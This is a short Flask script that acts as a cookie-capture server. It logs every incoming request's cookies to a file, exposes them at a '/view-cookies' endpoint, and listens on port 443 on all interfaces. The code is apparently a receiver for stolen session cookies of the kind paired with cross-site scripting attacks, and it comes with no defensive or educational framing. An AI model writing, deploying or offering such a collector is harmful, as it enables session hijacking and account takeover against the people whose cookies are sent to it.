from flask import Flask, request, Response

app = Flask(__name__)

@app.route('/', methods=['GET'])
def capture_cookie():
    # Log incoming cookies
    cookies = request.cookies
    print("Cookies captured:", cookies)

    # Save cookies to a file
    with open('captured_cookies.txt', 'a') as file:
        file.write(f"Cookies captured: {cookies}\n")
    
    # Return a response
    return "Cookies received and logged!", 200

@app.route('/view-cookies', methods=['GET'])
def view_cookies():
    try:
        # Read the content of the file
        with open('captured_cookies.txt', 'r') as file:
            content = file.read()
        return Response(content, mimetype='text/plain')
    except FileNotFoundError:
        return "No cookies have been captured yet.", 404

if __name__ == '__main__':
    app.run(port=443, host='0.0.0.0')
